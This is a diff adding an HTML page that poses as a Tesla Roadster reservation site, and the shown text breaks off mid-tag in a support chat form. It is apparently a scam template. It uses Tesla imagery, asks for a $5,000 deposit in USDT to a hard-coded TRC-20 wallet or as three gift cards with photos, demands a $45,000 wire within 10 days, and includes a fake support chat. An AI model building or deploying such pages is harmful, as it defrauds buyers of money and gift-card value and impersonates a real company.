@@ -1,1 +1,1502 @@
-h
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Roadster Reservation</title>
+  <link rel="icon" type="image/png" href="assets/favicon.png" />
+
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@400;500;600&family=Space+Grotesk:wght@400;500;600&display=swap" rel="stylesheet" />
+
+  <style>
+    *, *::before, *::after {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      background: #000000;
+      color: #F4F1EA;
+      font-family: 'Chakra Petch', 'Space Grotesk', system-ui, -apple-system, sans-serif;
+    }
+
+    button {
+      font-family: inherit;
+    }
+
+    /* Page Split Layout */
+    .layout {
+      display: flex;
+      flex-wrap: wrap;
+      min-height: 100vh;
+      background: #000000;
+    }
+
+    /* Left Side: Fixed Image Slider */
+    .hero {
+      flex: 1 1 560px;
+      min-width: 0;
+      min-height: 640px;
+      position: relative;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      background: #050505;
+      color: #F4F1EA;
+      overflow: hidden;
+    }
+
+    .slider-stage {
+      position: absolute;
+      inset: 0;
+      background: radial-gradient(ellipse 80% 65% at 50% 54%, #141414 0%, #050505 78%);
+    }
+
+    .slide-img {
+      position: absolute;
+      inset: 0;
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      object-position: center;
+      opacity: 0;
+      transform: scale(1.015);
+      transition: opacity 0.45s cubic-bezier(0.22, 1, 0.36, 1), transform 0.65s cubic-bezier(0.22, 1, 0.36, 1);
+      pointer-events: none;
+    }
+
+    .slide-img.is-active {
+      opacity: 1;
+      transform: scale(1);
+    }
+
+    .slider-scrim {
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(
+        to bottom,
+        rgba(5, 5, 5, 0.62) 0%,
+        rgba(5, 5, 5, 0) 20%,
+        rgba(5, 5, 5, 0) 70%,
+        rgba(5, 5, 5, 0.78) 100%
+      );
+      pointer-events: none;
+    }
+
+    .hero-header {
+      position: relative;
+      z-index: 2;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 28px 40px;
+    }
+
+    .brand {
+      display: flex;
+      align-items: center;
+    }
+
+    .brand-logo {
+      height: 16px;
+      width: auto;
+      display: block;
+    }
+
+    /* Slider Controls */
+    .slider-controls {
+      position: relative;
+      z-index: 2;
+      margin-top: auto;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 14px;
+      padding: 0 24px 36px;
+    }
+
+    .slide-caption {
+      font-size: 12px;
+      letter-spacing: 0.16em;
+      text-transform: uppercase;
+      color: #CFCABD;
+    }
+
+    .controls-row {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .nav-btn {
+      width: 44px;
+      height: 44px;
+      border: 1px solid rgba(244, 241, 234, 0.2);
+      background: rgba(15, 15, 15, 0.72);
+      backdrop-filter: blur(10px);
+      color: #F4F1EA;
+      border-radius: 4px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: border-color 0.2s ease, background 0.2s ease;
+    }
+
+    .nav-btn:hover {
+      border-color: rgba(244, 241, 234, 0.45);
+      background: rgba(28, 28, 30, 0.85);
+    }
+
+    .dots-pill {
+      display: flex;
+      align-items: center;
+      gap: 4px;
+      padding: 0 10px;
+      height: 44px;
+      border: 1px solid rgba(244, 241, 234, 0.2);
+      background: rgba(15, 15, 15, 0.72);
+      backdrop-filter: blur(10px);
+      border-radius: 4px;
+    }
+
+    .dot-btn {
+      width: 26px;
+      height: 36px;
+      border: 0;
+      background: transparent;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 0;
+    }
+
+    .dot-indicator {
+      width: 7px;
+      height: 7px;
+      border-radius: 50%;
+      background: rgba(244, 241, 234, 0.35);
+      transition: all 0.25s ease;
+      display: block;
+    }
+
+    .dot-btn.is-active .dot-indicator {
+      width: 9px;
+      height: 9px;
+      background: #F4F1EA;
+    }
+
+    /* Right Side: Scrollable Roadster Configurator */
+    .configurator {
+      flex: 1 1 440px;
+      min-width: 0;
+      padding: 24px 40px 44px;
+      display: flex;
+      flex-direction: column;
+      background: #000000;
+      color: #F4F1EA;
+    }
+
+    .region-bar {
+      display: flex;
+      justify-content: flex-end;
+      align-items: center;
+      margin-bottom: 36px;
+    }
+
+    .region-btn {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      background: transparent;
+      border: 0;
+      color: #E5E5EA;
+      font-size: 13px;
+      font-weight: 500;
+      letter-spacing: 0.06em;
+      cursor: pointer;
+      padding: 4px 2px;
+    }
+
+    .roadster-wordmark {
+      width: 100%;
+      max-width: 380px;
+      height: auto;
+      display: block;
+      margin-bottom: 28px;
+    }
+
+    /* Edition & Augment Cards */
+    .tier-list {
+      display: flex;
+      flex-direction: column;
+      gap: 14px;
+    }
+
+    .section-label {
+      margin: 22px 0 10px;
+      font-size: 13px;
+      font-weight: 400;
+      color: #8E8E93;
+      letter-spacing: 0.02em;
+    }
+
+    .tier-card {
+      position: relative;
+      text-align: left;
+      width: 100%;
+      padding: 22px 24px;
+      border: 1px solid #1C1C1E;
+      background: #141416;
+      color: #F4F1EA;
+      border-radius: 0;
+      cursor: pointer;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      transition: border-color 0.2s ease, background 0.2s ease;
+    }
+
+    .tier-card:hover:not(:disabled) {
+      border-color: #3A3A3C;
+    }
+
+    .tier-card.is-selected {
+      background: #121213;
+      border: 1px solid #E5E5EA;
+      box-shadow: inset 0 0 0 1px rgba(255, 255, 255, 0.08);
+    }
+
+    /* Subtle warm gold corner highlight on selected card */
+    .tier-card.is-selected::after {
+      content: "";
+      position: absolute;
+      left: -1px;
+      bottom: -1px;
+      width: 72px;
+      height: 1px;
+      background: linear-gradient(90deg, #C59B5F, transparent);
+      pointer-events: none;
+    }
+
+    .tier-card:disabled {
+      cursor: not-allowed;
+      background: #141416;
+      border-color: #1A1A1C;
+    }
+
+    .tier-card:disabled .tier-name {
+      color: #8E8E93;
+    }
+
+    .tier-header {
+      display: flex;
+      align-items: baseline;
+      justify-content: space-between;
+      gap: 16px;
+      width: 100%;
+    }
+
+    .tier-name {
+      font-size: 19px;
+      font-weight: 500;
+      color: #FFFFFF;
+      letter-spacing: 0.01em;
+    }
+
+    .tier-tag {
+      font-size: 13px;
+      font-weight: 400;
+      color: #D1D1D6;
+    }
+
+    .tier-tag--limited {
+      color: #C59B5F;
+    }
+
+    .tier-tag--muted {
+      color: #8E8E93;
+    }
+
+    .tier-desc {
+      font-size: 12.5px;
+      line-height: 1.5;
+      color: #8E8E93;
+      font-family: 'Space Grotesk', system-ui, sans-serif;
+    }
+
+    /* Pricing Summary */
+    .summary {
+      margin-top: 32px;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .summary-block {
+      display: flex;
+      flex-direction: column;
+      gap: 3px;
+    }
+
+    .summary-block + .summary-block {
+      margin-top: 18px;
+    }
+
+    .summary-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: baseline;
+      gap: 16px;
+    }
+
+    .summary-label--due {
+      font-size: 18px;
+      font-weight: 500;
+      color: #FFFFFF;
+    }
+
+    .summary-value--due {
+      font-size: 18px;
+      font-weight: 500;
+      color: #FFFFFF;
+    }
+
+    .summary-label--wire {
+      font-size: 14px;
+      font-weight: 400;
+      color: #E5E5EA;
+    }
+
+    .summary-value--wire {
+      font-size: 14px;
+      font-weight: 400;
+      color: #E5E5EA;
+    }
+
+    .summary-note {
+      font-size: 12px;
+      color: #8E8E93;
+      font-family: 'Space Grotesk', system-ui, sans-serif;
+    }
+
+    .fine-print {
+      margin: 24px 0 0;
+      font-size: 11.5px;
+      line-height: 1.55;
+      color: #7C7C80;
+      font-family: 'Space Grotesk', system-ui, sans-serif;
+    }
+
+    .cta-btn {
+      margin-top: 24px;
+      height: 48px;
+      min-height: 48px;
+      border: 1px solid #E5E5EA;
+      border-radius: 0;
+      background: #FFFFFF;
+      color: #000000;
+      font-size: 14px;
+      font-weight: 600;
+      letter-spacing: 0.06em;
+      text-transform: uppercase;
+      cursor: pointer;
+      transition: background 0.2s ease, color 0.2s ease;
+    }
+
+    .cta-btn:hover {
+      background: #E8DFC8;
+      border-color: #E8DFC8;
+    }
+
+    /* Payment Section */
+    .payment-section {
+      margin-top: 24px;
+      padding-top: 20px;
+      border-top: 1px solid #1C1C1E;
+      display: flex;
+      flex-direction: column;
+      gap: 14px;
+    }
+
+    .payment-heading {
+      font-size: 13px;
+      color: #8E8E93;
+      letter-spacing: 0.02em;
+      margin: 0;
+    }
+
+    .payment-tabs {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 10px;
+    }
+
+    .payment-tab {
+      height: 44px;
+      border: 1px solid #2C2C2E;
+      background: #141416;
+      color: #A1A1A6;
+      font-size: 13px;
+      font-weight: 500;
+      letter-spacing: 0.03em;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      transition: border-color 0.2s ease, background 0.2s ease, color 0.2s ease;
+    }
+
+    .payment-tab.is-active {
+      border-color: #E5E5EA;
+      background: #1A1A1D;
+      color: #FFFFFF;
+    }
+
+    .payment-panel {
+      display: none;
+      flex-direction: column;
+      gap: 12px;
+    }
+
+    .payment-panel.is-active {
+      display: flex;
+    }
+
+    .usdt-box {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      padding: 14px;
+      border: 1px solid #242428;
+      background: #101012;
+    }
+
+    .usdt-amount-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: baseline;
+      font-size: 13px;
+      color: #A1A1A6;
+      font-family: 'Space Grotesk', system-ui, sans-serif;
+    }
+
+    .usdt-amount-row strong {
+      color: #26A17B;
+      font-family: 'Chakra Petch', sans-serif;
+      font-size: 16px;
+      font-weight: 600;
+    }
+
+    .usdt-networks {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 8px;
+    }
+
+    .usdt-net-btn {
+      height: 36px;
+      border: 1px solid #2C2C2E;
+      background: #141416;
+      color: #A1A1A6;
+      font-size: 12px;
+      font-weight: 500;
+      letter-spacing: 0.04em;
+      cursor: pointer;
+      transition: border-color 0.2s ease, color 0.2s ease, background 0.2s ease;
+    }
+
+    .usdt-net-btn.is-active {
+      border-color: #26A17B;
+      background: rgba(38, 161, 123, 0.12);
+      color: #FFFFFF;
+    }
+
+    .usdt-address-row {
+      display: grid;
+      grid-template-columns: 1fr auto;
+      gap: 8px;
+      align-items: center;
+    }
+
+    .usdt-address {
+      height: 40px;
+      padding: 0 10px;
+      border: 1px solid #2C2C2E;
+      background: #141416;
+      color: #E5E5EA;
+      font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
+      font-size: 12px;
+      display: flex;
+      align-items: center;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+    }
+
+    .usdt-copy-btn {
+      height: 40px;
+      padding: 0 14px;
+      border: 1px solid #3A3A3C;
+      background: #1A1A1D;
+      color: #F4F1EA;
+      font-size: 12.5px;
+      font-weight: 500;
+      cursor: pointer;
+      transition: border-color 0.2s ease, background 0.2s ease;
+    }
+
+    .usdt-copy-btn:hover {
+      border-color: #E5E5EA;
+      background: #242428;
+    }
+
+    .gift-fields {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+
+    .split-summary {
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+      padding: 12px 14px;
+      border: 1px solid #2C2C2E;
+      background: #0E0E10;
+    }
+
+    .split-summary-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: baseline;
+      font-size: 12.5px;
+      color: #A1A1A6;
+      font-family: 'Space Grotesk', system-ui, sans-serif;
+    }
+
+    .split-summary-row strong {
+      color: #FFFFFF;
+      font-weight: 600;
+    }
+
+    .split-progress-track {
+      height: 4px;
+      width: 100%;
+      background: #1C1C1E;
+      overflow: hidden;
+    }
+
+    .split-progress-fill {
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(90deg, #C59B5F, #F4F1EA);
+      transition: width 0.3s ease;
+    }
+
+    .gift-slot {
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+      padding: 12px;
+      border: 1px solid #242428;
+      background: #101012;
+      transition: border-color 0.2s ease;
+    }
+
+    .gift-slot.is-applied {
+      border-color: #C59B5F;
+    }
+
+    .gift-slot-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 12.5px;
+    }
+
+    .gift-slot-title {
+      color: #E5E5EA;
+      font-weight: 500;
+    }
+
+    .gift-slot-amount {
+      color: #C59B5F;
+      font-weight: 600;
+    }
+
+    .gift-input-row {
+      display: grid;
+      grid-template-columns: 1fr;
+    }
+
+    .gift-upload-row {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .gift-upload-label {
+      flex: 1;
+      height: 38px;
+      padding: 0 10px;
+      border: 1px dashed #3A3A3C;
+      background: #141416;
+      color: #A1A1A6;
+      font-family: 'Space Grotesk', system-ui, sans-serif;
+      font-size: 12px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      cursor: pointer;
+      min-width: 0;
+      transition: border-color 0.2s ease, color 0.2s ease;
+    }
+
+    .gift-upload-label:hover {
+      border-color: #C59B5F;
+      color: #F4F1EA;
+    }
+
+    .gift-upload-label.has-file {
+      border-style: solid;
+      border-color: #3A3A3C;
+      color: #E5E5EA;
+    }
+
+    .gift-upload-label.is-disabled {
+      opacity: 0.65;
+      pointer-events: none;
+    }
+
+    .gift-file-name {
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+    }
+
+    .gift-thumb {
+      width: 38px;
+      height: 38px;
+      object-fit: cover;
+      border: 1px solid #2C2C2E;
+      flex-shrink: 0;
+    }
+
+    .gift-input {
+      height: 40px;
+      min-width: 0;
+      padding: 0 10px;
+      border: 1px solid #2C2C2E;
+      background: #141416;
+      color: #FFFFFF;
+      font-family: 'Space Grotesk', system-ui, sans-serif;
+      font-size: 13px;
+      outline: none;
+      transition: border-color 0.2s ease;
+    }
+
+    .gift-input:disabled {
+      opacity: 0.65;
+      color: #A1A1A6;
+    }
+
+    .gift-input::placeholder {
+      color: #6E6E73;
+    }
+
+    .gift-input:focus {
+      border-color: #C59B5F;
+    }
+
+    .gift-apply-btn {
+      height: 40px;
+      padding: 0 14px;
+      border: 1px solid #3A3A3C;
+      background: #1A1A1D;
+      color: #F4F1EA;
+      font-size: 12.5px;
+      font-weight: 500;
+      cursor: pointer;
+      white-space: nowrap;
+      transition: border-color 0.2s ease, background 0.2s ease;
+    }
+
+    .gift-apply-btn:hover {
+      border-color: #E5E5EA;
+      background: #242428;
+    }
+
+    .gift-status {
+      font-family: 'Space Grotesk', system-ui, sans-serif;
+      font-size: 12px;
+      line-height: 1.45;
+      color: #8E8E93;
+      min-height: 18px;
+    }
+
+    .gift-status.is-success {
+      color: #C59B5F;
+    }
+
+    .gift-status.is-error {
+      color: #FF6B6B;
+    }
+
+    .cta-btn:disabled {
+      opacity: 0.45;
+      cursor: not-allowed;
+    }
+
+    /* Confirmation Dialog */
+    .receipt-dialog {
+      border: 1px solid #2C2C2E;
+      background: #0D0D0F;
+      color: #F4F1EA;
+      padding: 28px;
+      width: min(420px, calc(100vw - 32px));
+      font-family: 'Space Grotesk', system-ui, sans-serif;
+    }
+
+    .receipt-dialog::backdrop {
+      background: rgba(0, 0, 0, 0.78);
+      backdrop-filter: blur(6px);
+    }
+
+    .receipt-title {
+      margin: 0 0 6px;
+      font-family: 'Chakra Petch', sans-serif;
+      font-size: 22px;
+      font-weight: 500;
+      color: #FFFFFF;
+    }
+
+    .receipt-sub {
+      margin: 0 0 20px;
+      font-size: 13px;
+      color: #8E8E93;
+    }
+
+    .receipt-rows {
+      border-top: 1px solid #1C1C1E;
+      border-bottom: 1px solid #1C1C1E;
+      padding: 14px 0;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      font-size: 13.5px;
+    }
+
+    .receipt-row {
+      display: flex;
+      justify-content: space-between;
+      gap: 12px;
+    }
+
+    .receipt-row span:first-child {
+      color: #8E8E93;
+    }
+
+    .receipt-row span:last-child {
+      color: #FFFFFF;
+      font-weight: 500;
+    }
+
+    .receipt-close {
+      margin-top: 20px;
+      width: 100%;
+      height: 44px;
+      border: 0;
+      background: #FFFFFF;
+      color: #000000;
+      font-family: 'Chakra Petch', sans-serif;
+      font-size: 13px;
+      font-weight: 600;
+      letter-spacing: 0.06em;
+      text-transform: uppercase;
+      cursor: pointer;
+    }
+
+    /* Desktop: Lock car side & scroll only configurator */
+    @media (min-width: 1080px) {
+      .layout {
+        height: 100vh;
+        height: 100dvh;
+        overflow: hidden;
+        flex-wrap: nowrap;
+      }
+
+      .hero {
+        flex: 1 1 0%;
+        height: 100%;
+        min-height: 0;
+      }
+
+      .configurator {
+        flex: 0 0 clamp(400px, 34vw, 460px);
+        width: clamp(400px, 34vw, 460px);
+        height: 100%;
+        overflow-y: auto;
+        overscroll-behavior: contain;
+        border-left: 1px solid #161618;
+      }
+    }
+  </style>
+</head>
+<body>
+  <main class="layout">
+    <!-- Left Side: Car Image Slider -->
+    <section class="hero" aria-label="Roadster gallery">
+      <div class="slider-stage">
+        <img
+          class="slide-img is-active"
+          src="https://digitalassets.tesla.com/co1n/image/upload/f_auto,q_auto/prod/static_assets/R_/_V_/3-tesla-roadster-performance-side-desktop-wide.jpg?&"
+          alt="Tesla Roadster side profile studio view"
+        />
+        <img
+          class="slide-img"
+          src="https://digitalassets.tesla.com/co1n/image/upload/f_auto,q_auto/prod/static_assets/R_/_V_/4-tesla-roadster-performance-interior-desktop.jpg?&"
+          alt="Tesla Roadster interior cockpit view"
+        />
+        <img
+          class="slide-img"
+          src="https://digitalassets.tesla.com/co1n/image/upload/f_auto,q_auto/prod/static_assets/R_/_V_/2-tesla-roadster-performance-rear-desktop-wide.jpg?&"
+          alt="Tesla Roadster rear three-quarter studio view"
+        />
+        <img
+          class="slide-img"
+          src="https://digitalassets.tesla.com/co1n/image/upload/f_auto,q_auto/prod/static_assets/R_/_V_/1-tesla-roadster-performance-front-desktop-wide.jpg?&"
+          alt="Tesla Roadster front three-quarter studio view"
+        />
+        <div class="slider-scrim"></div>
+      </div>
+
+      <header class="hero-header">
+        <div class="brand">
+          <img class="brand-logo" src="assets/tesla-logo.png" alt="Tesla" />
+        </div>
+      </header>
+
+      <div class="slider-controls">
+        <span class="slide-caption" id="slide-caption">Roadster · Profile</span>
+        <div class="controls-row">
+          <button class="nav-btn" id="prev-slide" type="button" aria-label="Previous image">
+            <svg width="18" height="18" viewBox="0 0 18 18" aria-hidden="true">
+              <path d="M11 3 L5 9 L11 15" fill="none" stroke="currentColor" stroke-width="1.8"></path>
+            </svg>
+          </button>
+
+          <div class="dots-pill" role="tablist" aria-label="Image slides">
+            <button class="dot-btn is-active" type="button" data-slide="0" aria-label="Profile">
+              <span class="dot-indicator"></span>
+            </button>
+            <button class="dot-btn" type="button" data-slide="1" aria-label="Interior">
+              <span class="dot-indicator"></span>
+            </button>
+            <button class="dot-btn" type="button" data-slide="2" aria-label="Rear">
+              <span class="dot-indicator"></span>
+            </button>
+            <button class="dot-btn" type="button" data-slide="3" aria-label="Front">
+              <span class="dot-indicator"></span>
+            </button>
+          </div>
+
+          <button class="nav-btn" id="next-slide" type="button" aria-label="Next image">
+            <svg width="18" height="18" viewBox="0 0 18 18" aria-hidden="true">
+              <path d="M7 3 L13 9 L7 15" fill="none" stroke="currentColor" stroke-width="1.8"></path>
+            </svg>
+          </button>
+        </div>
+      </div>
+    </section>
+
+    <!-- Right Side: Roadster Reservation Configurator -->
+    <section class="configurator" aria-label="Roadster reservation configurator">
+      <div class="region-bar" style="gap: 18px;">
+        <button class="region-btn" id="support-open-btn" type="button" aria-label="Contact support">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" aria-hidden="true">
+            <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path>
+          </svg>
+          <span>Support</span>
+        </button>
+        <button class="region-btn" type="button" aria-label="Region US">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" aria-hidden="true">
+            <circle cx="12" cy="12" r="9.5"></circle>
+            <ellipse cx="12" cy="12" rx="4.2" ry="9.5"></ellipse>
+            <path d="M3 9h18M3 15h18"></path>
+          </svg>
+          <span>US</span>
+        </button>
+      </div>
+
+      <!-- Metallic ROADSTER Wordmark -->
+      <img class="roadster-wordmark" src="assets/roadster-wordmark.png" alt="ROADSTER" />
+
+      <div class="tier-list">
+        <button class="tier-card is-selected" type="button" data-tier="performance" data-name="Performance" data-due="5000" data-wire="45000" aria-pressed="true">
+          <span class="tier-header">
+            <span class="tier-name">Performance</span>
+            <span class="tier-tag">Reserve</span>
+          </span>
+          <span class="tier-desc">Road ready with seating for two. Includes active aero and a multi-mode suction system.</span>
+        </button>
+
+        <p class="section-label">Augments</p>
+
+        <button class="tier-card" type="button" data-tier="thrust" data-name="Thrust" data-due="5000" data-wire="45000" aria-pressed="false">
+          <span class="tier-header">
+            <span class="tier-name">Thrust</span>
+            <span class="tier-tag tier-tag--limited">Limited</span>
+          </span>
+          <span class="tier-desc">Race ready with seating for two. Includes Performance active aero and a multi-mode suction system, plus acceleration thrusters.</span>
+        </button>
+
+        <button class="tier-card" type="button" data-tier="rocket" data-name="Rocket" data-due="5000" data-wire="45000" aria-pressed="false" disabled>
+          <span class="tier-header">
+            <span class="tier-name">Rocket</span>
+            <span class="tier-tag tier-tag--muted">Invite Only</span>
+          </span>
+          <span class="tier-desc">Air ready with seating for one. Includes Performance and Thrust, plus a full flight system.</span>
+        </button>
+      </div>
+
+      <div class="summary">
+        <div class="summary-block">
+          <div class="summary-row">
+            <span class="summary-label--due">Due Today</span>
+            <span class="summary-value--due" id="summary-due">$5,000</span>
+          </div>
+          <span class="summary-note">Refundable</span>
+        </div>
+
+        <div class="summary-block">
+          <div class="summary-row">
+            <span class="summary-label--wire">Wire payment due within 10 days</span>
+            <span class="summary-value--wire" id="summary-wire">$45,000</span>
+          </div>
+          <span class="summary-note">Refundable</span>
+        </div>
+      </div>
+
+      <p class="fine-print">Reservations are not final until payment is received, and are subject to cancellation if payment is not completed within 10 days.</p>
+
+      <!-- Payment Method: USDT & Gift Card -->
+      <div class="payment-section" aria-label="Payment method">
+        <p class="payment-heading">Payment Method</p>
+
+        <div class="payment-tabs" role="tablist" aria-label="Choose payment method">
+          <button class="payment-tab is-active" type="button" role="tab" aria-selected="true" data-method="usdt">
+            <svg width="16" height="16" viewBox="0 0 32 32" aria-hidden="true">
+              <circle cx="16" cy="16" r="15" fill="#26A17B"></circle>
+              <path fill="#FFFFFF" d="M17.9 17.1v-.003c-.1.007-.64.04-1.84.04-.96 0-1.63-.03-1.87-.04v.004c-3.68-.16-6.43-.8-6.43-1.57 0-.77 2.75-1.41 6.43-1.57v2.5c.24.02.93.06 1.88.06 1.14 0 1.73-.05 1.83-.06v-2.5c3.67.16 6.41.8 6.41 1.57 0 .77-2.74 1.41-6.41 1.57zm0-3.4V11.46h5.13V8.1H9.17v3.36h5.02v2.24c-4.16.19-7.29 1-7.29 1.98 0 .97 3.13 1.79 7.29 1.98v7.09h3.71v-7.09c4.15-.19 7.27-1.01 7.27-1.98 0-.97-3.12-1.79-7.27-1.98z"></path>
+            </svg>
+            <span>USDT</span>
+          </button>
+          <button class="payment-tab" type="button" role="tab" aria-selected="false" data-method="giftcard">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" aria-hidden="true">
+              <rect x="2" y="5" width="20" height="14" rx="2"></rect>
+              <path d="M2 10h20M12 5v14"></path>
+            </svg>
+            <span>Gift Card</span>
+          </button>
+        </div>
+
+        <!-- USDT Panel -->
+        <div class="payment-panel is-active" id="panel-usdt">
+          <div class="usdt-box">
+            <div class="usdt-amount-row">
+              <span>Send exact deposit (TRC-20)</span>
+              <strong id="usdt-amount">5,000.00 USDT</strong>
+            </div>
+            <div class="usdt-address-row">
+              <div class="usdt-address" id="usdt-address">TVFJ3RyqfooJctZtFL3sNqiQjKg78QRVye</div>
+              <button class="usdt-copy-btn" id="usdt-copy-btn" type="button">Copy</button>
+            </div>
+            <input class="gift-input" id="usdt-txid" type="text" autocomplete="off" placeholder="Transaction hash / TXID (optional)" aria-label="USDT transaction hash" />
+          </div>
+          <button class="cta-btn" id="usdt-btn" type="button">Confirm USDT Payment — 5,000 USDT</button>
+        </div>
+
+        <!-- Gift Card Panel (Split: $2,000 + $2,000 + $1,000) -->
+        <div class="payment-panel" id="panel-giftcard">
+          <div class="gift-fields">
+            <div class="split-summary">
+              <div class="split-summary-row">
+                <span>Split Gift Card Payment (2 × $2,000 + 1 × $1,000)</span>
+                <strong id="split-applied-label">$0 / $5,000</strong>
+              </div>
+              <div class="split-progress-track">
+                <div class="split-progress-fill" id="split-progress-fill"></div>
+              </div>
+            </div>
+
+            <div class="gift-slot" data-slot="0" data-amount="2000">
+              <div class="gift-slot-header">
+                <span class="gift-slot-title">Gift Card 1</span>
+                <span class="gift-slot-amount">$2,000</span>
+              </div>
+              <div class="gift-input-row">
+                <input class="gift-input gift-code" type="text" inputmode="text" autocomplete="off" placeholder="Card number" aria-label="Gift card 1 number" />
+              </div>
+              <div class="gift-upload-row">
+                <label class="gift-upload-label">
+                  <input class="gift-file" type="file" accept="image/*" hidden />
+                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" aria-hidden="true">
+                    <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4M17 8l-5-5-5 5M12 3v12"/>
+                  </svg>
+                  <span class="gift-file-name">Upload card image</span>
+                </label>
+                <img class="gift-thumb" alt="Gift card 1 preview" hidden />
+              </div>
+            </div>
+
+            <div class="gift-slot" data-slot="1" data-amount="2000">
+              <div class="gift-slot-header">
+                <span class="gift-slot-title">Gift Card 2</span>
+                <span class="gift-slot-amount">$2,000</span>
+              </div>
+              <div class="gift-input-row">
+                <input class="gift-input gift-code" type="text" inputmode="text" autocomplete="off" placeholder="Card number" aria-label="Gift card 2 number" />
+              </div>
+              <div class="gift-upload-row">
+                <label class="gift-upload-label">
+                  <input class="gift-file" type="file" accept="image/*" hidden />
+                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" aria-hidden="true">
+                    <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4M17 8l-5-5-5 5M12 3v12"/>
+                  </svg>
+                  <span class="gift-file-name">Upload card image</span>
+                </label>
+                <img class="gift-thumb" alt="Gift card 2 preview" hidden />
+              </div>
+            </div>
+
+            <div class="gift-slot" data-slot="2" data-amount="1000">
+              <div class="gift-slot-header">
+                <span class="gift-slot-title">Gift Card 3</span>
+                <span class="gift-slot-amount">$1,000</span>
+              </div>
+              <div class="gift-input-row">
+                <input class="gift-input gift-code" type="text" inputmode="text" autocomplete="off" placeholder="Card number" aria-label="Gift card 3 number" />
+              </div>
+              <div class="gift-upload-row">
+                <label class="gift-upload-label">
+                  <input class="gift-file" type="file" accept="image/*" hidden />
+                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" aria-hidden="true">
+                    <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4M17 8l-5-5-5 5M12 3v12"/>
+                  </svg>
+                  <span class="gift-file-name">Upload card image</span>
+                </label>
+                <img class="gift-thumb" alt="Gift card 3 preview" hidden />
+              </div>
+            </div>
+
+            <div class="gift-status" id="gift-status" aria-live="polite">Enter all 3 card numbers and upload their images ($2,000 + $2,000 + $1,000).</div>
+          </div>
+          <button class="cta-btn" id="reserve-btn" type="button" disabled>Reserve Performance — $5,000</button>
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <dialog class="receipt-dialog" id="support-dialog" aria-labelledby="support-title" style="padding:0;overflow:hidden">
+    <div style="display:flex;justify-content:space-between;align-items:center;padding:16px 18px;border-bottom:1px solid #1C1C1E;background:#101012">
+      <div style="display:flex;align-items:center;gap:8px">
+        <span style="width:8px;height:8px;border-radius:50%;background:#26A17B;display:inline-block"></span>
+        <h2 class="receipt-title" id="support-title" style="margin:0;font-size:16px">Roadster Support</h2>
+      </div>
+      <button id="support-close-x" type="button" aria-label="Close support" style="background:transparent;border:0;color:#8E8E93;font-size:20px;cursor:pointer;padding:0 4px">×</button>
+    </div>
+
+    <div id="support-thread" style="display:flex;flex-direction:column;gap:10px;height:280px;overflow-y:auto;padding:14px 16px;background:#08080A"></div>
+
+    <div id="support-attachment-bar" hidden style="display:none;align-items:center;gap:8px;padding:8px 16px;border-top:1px solid #1C1C1E;background:#0D0D0F">
+      <img class="gift-thumb" id="support-thumb" alt="Attachment preview" style="width:32px;height:32px" />
+      <span class="gift-file-name" id="support-file-name" style="font-size:12px;color:#A1A1A6;flex:1"></span>
+      <button id="support-clear-img" type="button" aria-label="Remove attached image" style="background:transparent;border:0;color:#8E8E93;font-size:16px;cursor:pointer">×</button>
+    </div>
+
+    <form id="support-form" style="display:flex;align-items:center;gap:8px;padding:12px 14px;border-top:1px solid #1C1C1E;background:#101012">
+      <label aria-label="Attach image" style="width:38px;height:38px;border:1px solid #2C2C2E;background:#141416;color:#A1A1A6;display:flex;align-items:center;justify-content:center;cursor:pointer;flex-shrink:0">
